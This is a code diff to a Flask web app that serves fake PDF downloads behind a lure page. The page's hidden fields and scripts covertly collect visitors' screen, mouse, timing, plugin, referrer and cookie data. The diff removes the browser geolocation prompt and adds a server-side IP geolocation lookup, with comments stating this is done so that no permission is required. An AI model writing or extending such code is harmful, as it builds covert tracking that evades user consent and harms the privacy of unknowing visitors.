@@ -5,6 +5,7 @@ import os
 from faker import Faker
 from io import BytesIO
 from reportlab.pdfgen import canvas
+import requests
 
 app = Flask(__name__)
 
@@ -18,7 +19,23 @@ logging.basicConfig(
 # Initialize Faker for generating fake PDF content
 fake = Faker()
 
-# HTML page with a styled download button and embedded JavaScript to capture extensive client-side data
+def get_ip_geolocation(ip):
+    """
+    Fetch geolocation data based on the client's IP address using ip-api.com.
+    This method avoids prompting the user for location permission.
+    """
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("status") == "success":
+                return data.get("lat"), data.get("lon"), data
+    except Exception as e:
+        logging.error(f"IP Geolocation error: {e}")
+    return None, None, {}
+
+# HTML page with a styled download button and embedded JavaScript to capture extensive client-side data.
+# The geolocation prompt has been removed so that location is fetched on the server side.
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -64,8 +81,9 @@ HTML_PAGE = """
         <input type="hidden" name="pageLoadTime" id="pageLoadTime">
         <input type="hidden" name="clickTime" id="clickTime">
         <input type="hidden" name="dwellTime" id="dwellTime">
-        <input type="hidden" name="latitude" id="latitude">
-        <input type="hidden" name="longitude" id="longitude">
+        <!-- Note: latitude and longitude will be determined server-side -->
+        <input type="hidden" name="latitude" id="latitude" value="">
+        <input type="hidden" name="longitude" id="longitude" value="">
         <input type="hidden" name="lastMouseX" id="lastMouseX">
         <input type="hidden" name="lastMouseY" id="lastMouseY">
         <input type="hidden" name="referrer" id="referrer">
@@ -148,7 +166,7 @@ HTML_PAGE = """
             }
         }
         
-        // Intercept form submission to capture client-side data
+        // Intercept form submission to capture client-side data without prompting for geolocation
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -172,21 +190,9 @@ HTML_PAGE = """
             document.getElementById('lastMouseX').value = lastMouseX;
             document.getElementById('lastMouseY').value = lastMouseY;
             
-            // Gather extra data then get geolocation and finally submit the form
+            // Gather extra data then submit the form (without triggering a geolocation prompt)
             gatherExtraData(function() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(position) {
-                        document.getElementById('latitude').value = position.coords.latitude;
-                        document.getElementById('longitude').value = position.coords.longitude;
-                        e.target.submit();
-                    }, function(error) {
-                        document.getElementById('latitude').value = '';
-                        document.getElementById('longitude').value = '';
-                        e.target.submit();
-                    });
-                } else {
-                    e.target.submit();
-                }
+                e.target.submit();
             });
         });
     </script>
@@ -206,7 +212,7 @@ def download():
     cookies = request.cookies
     tls_metadata = request.environ.get('wsgi.url_scheme')
     
-    # Client-side data from hidden form fields, including advanced data
+    # Retrieve client-side data from the form submission
     client_data = {
         'screenWidth': request.form.get('screenWidth'),
         'screenHeight': request.form.get('screenHeight'),
@@ -218,8 +224,6 @@ def download():
         'pageLoadTime': request.form.get('pageLoadTime'),
         'clickTime': request.form.get('clickTime'),
         'dwellTime': request.form.get('dwellTime'),
-        'latitude': request.form.get('latitude'),
-        'longitude': request.form.get('longitude'),
         'lastMouseX': request.form.get('lastMouseX'),
         'lastMouseY': request.form.get('lastMouseY'),
         'referrer': request.form.get('referrer'),
@@ -234,6 +238,12 @@ def download():
         'plugins': request.form.get('plugins')
     }
     
+    # Fetch geolocation data using the client IP (no permission required)
+    lat, lon, geo_data = get_ip_geolocation(ip)
+    client_data['latitude'] = lat if lat is not None else ""
+    client_data['longitude'] = lon if lon is not None else ""
+    client_data['ip_geolocation'] = geo_data
+
     # Log all the gathered data in JSON format for easy parsing
     log_message = {
         'ip': ip,
